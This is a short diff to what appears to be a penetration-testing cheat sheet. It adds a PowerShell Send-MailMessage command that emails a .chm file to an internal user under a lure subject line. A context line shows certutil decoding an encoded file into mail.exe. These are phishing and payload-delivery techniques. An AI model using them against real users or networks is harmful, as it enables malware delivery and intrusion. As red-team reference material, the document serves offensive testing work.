@@ -465,4 +465,13 @@ certutil -decode encoded.txt mail.exe
 ```
 
 &nbsp;
+
+**[+] Send a message with attachments (Powershell)**
+
+```powershell
+Send-MailMessage -From "user<user@domain.com>" -To "lbunce<lbunce@amazecorp.local>" -Subject "Check the important doc please" -SmtpServer 192.168.21.55 -Attachments .\doc.chm
+```
+
+
+&nbsp;
 &nbsp;
